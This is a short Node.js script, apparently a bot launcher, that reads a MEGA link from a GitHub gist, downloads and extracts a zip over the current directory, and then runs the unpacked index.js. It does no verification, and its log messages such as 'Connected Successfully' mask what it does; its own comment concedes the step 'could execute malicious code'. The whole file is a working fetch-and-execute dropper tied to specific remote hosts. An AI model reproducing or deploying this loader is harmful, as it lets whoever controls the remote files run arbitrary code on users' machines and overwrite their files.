const fs = require("fs");
const path = require("path");
const { File } = require("megajs");
const AdmZip = require("adm-zip");
const axios = require("axios");

const downloadAndExtractMegaZip = (url) =>
  new Promise((resolve, reject) => {
    try {
      console.log("Downloading Files...");
      const file = File.fromURL(url);
      const outputPath = path.join(process.cwd(),"plugins.zip");
      file.download((err, data) => {
        if (err) return reject(err);
        fs.writeFileSync(outputPath, data);
        const zip = new AdmZip(outputPath);
        zip.extractAllTo(process.cwd(), true);
        fs.unlinkSync(outputPath);
        console.log("Connected Successfully");
        resolve();
      });
    } catch (err) {
      reject(err);
    }
  });

const main = async () => {
  try {
    console.log("Fetching data...");
    const { data } = await axios.get(
      "https://gist.githubusercontent.com/gojosathory2/2e840cc716a6be43599aa8c298a4cec8/raw/0a0522fdfaf9d585f5470b01db09c909c574db7b/Pakayas.json"
    );
    await downloadAndExtractMegaZip(data.mega);
    console.log("Executing...");
    require("./index.js"); // Warning: This could execute malicious code
  } catch (err) {
    console.error("Error:", err.message);
  }
};

main();
